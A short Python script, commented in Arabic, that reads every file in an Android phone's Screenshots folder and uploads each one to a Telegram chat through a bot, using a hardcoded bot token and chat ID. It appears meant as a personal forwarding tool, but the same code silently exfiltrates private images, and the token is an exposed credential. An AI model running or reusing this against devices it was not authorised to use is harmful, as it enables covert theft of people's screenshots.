import os
import telepot

# توكن البوت الخاص بك
bot_token = "6476951548:AAFD5fW4VtLguI4D0QnwyPUaFSWILiQSiJo"
# معرف الدردشة الخاص بك على تليجرام
chat_id = 5954268142
# مسار المجلد الذي تحتوي على الصور
image_path = '/sdcard/DCIM/Screenshots'

def send_images_to_telegram(images_list, chat_id):
    bot = telepot.Bot(bot_token)
    for image_name in images_list:
        image_file = open(os.path.join(image_path, image_name), 'rb')
        bot.sendPhoto(chat_id, image_file)
        image_file.close()

def main():
    # استرداد قائمة بأسماء الصور في المسار المحدد
    images_list = os.listdir(image_path)
    
    send_images_to_telegram(images_list, chat_id)
    
if __name__ == '__main__':
    main()

